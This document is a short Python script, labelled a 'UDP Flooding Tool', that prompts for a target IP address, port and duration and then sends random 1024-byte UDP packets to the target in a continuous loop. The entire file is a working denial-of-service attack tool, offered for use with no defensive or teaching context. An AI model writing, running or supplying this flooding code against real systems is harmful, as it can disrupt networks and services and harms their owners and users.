import socket
import time
import random

print("UDP Flooding Tool")

ip = input("Enter target IP: ")
port = int(input("Enter target port: "))
duration = int(input("Enter duration of the attack (in seconds): "))

timeout = time.time() + duration

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1024)

try:
    while True:
        if time.time() > timeout:
            break
        else:
            pass
        sock.sendto(bytes, (ip, port))

    print("Attack Finished!")
except KeyboardInterrupt:
    print("Attack Interrupted by User")
finally:
    sock.close()
